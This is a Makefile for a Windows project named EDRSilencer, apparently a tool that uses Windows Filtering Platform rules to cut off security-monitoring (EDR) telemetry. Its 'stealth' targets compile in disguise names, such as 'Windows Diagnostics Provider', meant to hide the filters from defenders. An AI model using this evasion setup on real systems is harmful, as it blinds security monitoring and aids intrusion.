# Compiler
CXX = x86_64-w64-mingw32-g++

# --- Source File Definitions ---
# Common source files used by both EXE and DLL
COMMON_SRCS = src/core.cpp src/utils.cpp src/process.cpp src/errors.cpp src/firewall.cpp
# Header files that should trigger a rebuild if changed
HEADERS = include/core.hpp include/utils.hpp include/process.hpp include/errors.hpp include/firewall.hpp
# Entry-point source for the Executable
EXE_SRC = src/main.cpp
# Entry-point source for the DLL
DLL_SRC = src/dllmain.cpp

# --- Target Filename Definitions ---
TARGET_EXE_RELEASE = EDRSilencer.exe
TARGET_EXE_DEBUG = EDRSilencer_debug.exe
TARGET_DLL_RELEASE = EDRSilencer.dll
TARGET_DLL_DEBUG = EDRSilencer_debug.dll
TARGET_EXE_STEALTH = EDRSilencer-stealth.exe
TARGET_DLL_STEALTH = EDRSilencer-stealth.dll

# --- Flag Definitions ---
# Common flags for C++ compilation
CXXFLAGS = -Wall -Wextra -std=c++11 -Iinclude
CXXFLAGS_RELEASE = $(CXXFLAGS) -O2 -D_WIN32_WINNT=0x0601
CXXFLAGS_DEBUG = $(CXXFLAGS) -g -D_WIN32_WINNT=0x0601
# Linker flags for building an EXE
LDFLAGS_EXE = -lfwpuclnt -lole32 -loleaut32 -luuid -lrpcrt4
# Linker flags for building a DLL (note the -shared flag)
LDFLAGS_DLL = -lfwpuclnt -lole32 -loleaut32 -luuid -lrpcrt4 -shared

.PHONY: all release debug dll dll-debug stealth stealth-dll clean

# Stealth/OPSEC defines (wide-string literals). Adjust names to blend in.
STEALTH_DEFINES = \
  -DEDR_PROVIDER_NAME='L"Windows Diagnostics Provider"' \
  -DEDR_SUBLAYER_NAME='L"Network Telemetry SubLayer"' \
  -DEDR_PROVIDER_DESCRIPTION='L"Windows diagnostics components"' \
  -DEDR_SUBLAYER_DESCRIPTION='L"Telemetry flow arbitration"' \
  -DFIREWALL_RULE_GROUP='L"@Windows Diagnostics"' \
  -DFIREWALL_RULE_NAME_FORMAT='L"Block Rule for %s"' \
  -DEDR_FILTER_NAME='L"Generic Network Block Rule"'

# --- Main Targets ---

# Default target: 'make' or 'make all' will build the release EXE
all: release

# 'make release' builds the release EXE
release: $(TARGET_EXE_RELEASE)

# 'make debug' builds the debug EXE
debug: $(TARGET_EXE_DEBUG)

# 'make dll' builds the release DLL
dll: $(TARGET_DLL_RELEASE)

# 'make dll-debug' builds the debug DLL
dll-debug: $(TARGET_DLL_DEBUG)

# --- Stealth Targets ---

# 'make stealth' builds the release EXE with stealthy names/descriptions
stealth: $(TARGET_EXE_STEALTH)

# 'make stealth-dll' builds the release DLL with stealth defines
stealth-dll: $(TARGET_DLL_STEALTH)

# --- Build Rules ---

# Rule to build the release EXE
$(TARGET_EXE_RELEASE): $(COMMON_SRCS) $(EXE_SRC) $(HEADERS)
	$(CXX) $(CXXFLAGS_RELEASE) $(filter %.cpp,$^) -o $(TARGET_EXE_RELEASE) $(LDFLAGS_EXE) -s
	@echo "Release EXE build complete: $(TARGET_EXE_RELEASE)"

# Rule to build the debug EXE
$(TARGET_EXE_DEBUG): $(COMMON_SRCS) $(EXE_SRC) $(HEADERS)
	$(CXX) $(CXXFLAGS_DEBUG) $(filter %.cpp,$^) -o $(TARGET_EXE_DEBUG) $(LDFLAGS_EXE)
	@echo "Debug EXE build complete: $(TARGET_EXE_DEBUG)"

# Rule to build the release DLL
$(TARGET_DLL_RELEASE): $(COMMON_SRCS) $(DLL_SRC) $(HEADERS)
	$(CXX) $(CXXFLAGS_RELEASE) $(filter %.cpp,$^) -o $@ $(LDFLAGS_DLL) -s
	@echo "Release DLL build complete: $@"

# Rule to build the debug DLL
$(TARGET_DLL_DEBUG): $(COMMON_SRCS) $(DLL_SRC) $(HEADERS)
	$(CXX) $(CXXFLAGS_DEBUG) $(filter %.cpp,$^) -o $@ $(LDFLAGS_DLL)
	@echo "Debug DLL build complete: $@"

# Rule to build the stealth EXE
$(TARGET_EXE_STEALTH): $(COMMON_SRCS) $(EXE_SRC) $(HEADERS)
	$(CXX) $(CXXFLAGS_RELEASE) $(STEALTH_DEFINES) $(filter %.cpp,$^) -o $(TARGET_EXE_STEALTH) $(LDFLAGS_EXE) -s
	@echo "Stealth EXE build complete: $(TARGET_EXE_STEALTH)"

# Rule to build the stealth DLL
$(TARGET_DLL_STEALTH): $(COMMON_SRCS) $(DLL_SRC) $(HEADERS)
	$(CXX) $(CXXFLAGS_RELEASE) $(STEALTH_DEFINES) $(filter %.cpp,$^) -o $(TARGET_DLL_STEALTH) $(LDFLAGS_DLL) -s
	@echo "Stealth DLL build complete: $@"

# --- Cleanup Target ---
clean:
	rm -f $(TARGET_EXE_RELEASE) $(TARGET_EXE_DEBUG) $(TARGET_DLL_RELEASE) $(TARGET_DLL_DEBUG) $(TARGET_EXE_STEALTH) $(TARGET_DLL_STEALTH)
	@echo "Cleanup complete."
